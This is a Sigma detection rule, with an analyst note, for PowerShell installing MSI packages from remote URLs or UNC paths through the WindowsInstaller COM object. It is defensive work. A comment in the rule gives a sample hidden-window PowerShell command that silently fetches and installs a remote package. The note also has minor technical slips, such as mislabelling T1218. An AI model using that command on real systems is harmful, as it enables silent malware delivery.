title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
id: 222720a7-047f-4054-baa5-bab9be757db0
status: experimental
description: |
  Detects the execution of PowerShell commands that attempt to install MSI packages via the
  Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
  This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
  And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-06-05
tags:
- attack.execution
- attack.stealth
- attack.t1059.001
- attack.t1218
- attack.command-and-control
- attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
  selection_remote:
    CommandLine|contains:
    - 'http'
    - '\\\\'
  filter_main_localhost:
    CommandLine|contains:
    - '://127.0.0.1'
    - '://localhost'
  condition: all of selection_* and not 1 of filter_main_*
falsepositives:
- Unknown
level: medium
note: |
  ### Technical Context

  This Sigma rule detects the execution of PowerShell commands that utilize the Windows Installer COM object (`WindowsInstaller.Installer`) to install MSI packages from a remote location. This behavior is suspicious as it may indicate an attempt by an adversary to deploy malicious software or facilitate lateral movement within the network using Windows Installer functionality. The relevant MITRE ATT&CK tactics include Execution (T1059.001) and Command-Line Interface (T1218).

  Primary telemetry sources include process creation logs from Windows, specifically looking for security Event ID 4688 and Sysmon Event ID 1. The security impact of this detection is significant, as successful exploitation could lead to unauthorized software installation and potential compromise of the affected system. However, it is important to note that the detection of this behavior does NOT confirm malicious intent on its own, as legitimate use cases might exist.

  ### Investigation Steps

  - **Review PowerShell execution details:** Check for Security Event ID 4688 and Sysmon Event ID 1 logs for process creation events involving powershell.exe, powershell_ise.exe, or pwsh.exe. Focus on command lines that include `-ComObject` and `InstallProduct(`, as these are key indicators of suspicious activity.

  - **Validate remote installation sources:** Inspect the command line arguments to identify any instances where a URL or UNC path (`http` or `\\`) is referenced. Legitimate installations typically do not originate from remote locations and should avoid excessive use of PowerShell in this context.

  - **Identify malicious indicators:** Look for command line entries that contain `InstallProduct(` instructed from a non-local address (not including `127.0.0.1` or `localhost`). If such instances are found, flag them as high confidence indicators of potentially malicious activity.

  - **Correlate with endpoint behavior:** Monitor any software installation and related activity reported by Windows Event logs (such as Event ID 1001 from MSI Installer logs) to determine if additional suspicious events coincide with the suspicious PowerShell execution.

  - **Review legitimate use cases:** Verify instances where Windows Installer processes are typically executed, such as installing trusted applications or updates initiated by system administrators. This can help differentiate between legitimate and suspicious activity.

  ### Prioritization

  This alert should be considered medium severity due to the potential for significant impact if compromised systems allow unauthorized software installation. The likelihood of malicious abuse is moderate, as adversaries often employ PowerShell to execute such installations, particularly when attempting to bypass detection mechanisms.

  ### Blind Spots and Assumptions

  Detection is limited by potential evasion techniques, such as legitimate PowerShell use for administrative tasks that may trigger similar alerts. Reliable detection relies on complete logging configurations for Windows process creation and sysmon to capture necessary event data. Legitimate system updates or installations initiated by IT staff may trigger this alert. A complementary detection rule focusing on cmd.exe or msiexec.exe executed with remote URL access could enhance coverage against similar threats.

